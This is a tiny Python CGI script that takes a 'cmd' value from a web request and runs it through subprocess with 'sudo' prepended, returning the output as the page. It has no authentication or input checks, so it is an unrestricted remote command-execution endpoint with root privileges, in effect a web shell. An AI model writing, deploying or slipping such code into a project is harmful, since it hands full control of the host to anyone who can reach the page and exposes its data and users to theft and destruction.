#!/usr/bin/python3

print("content-type: text/html")
print()

import subprocess as sp
import cgi
field = cgi.FieldStorage()
value=field.getvalue('cmd')
#print(value)
output = sp.getoutput('sudo ' + value)
print(output)




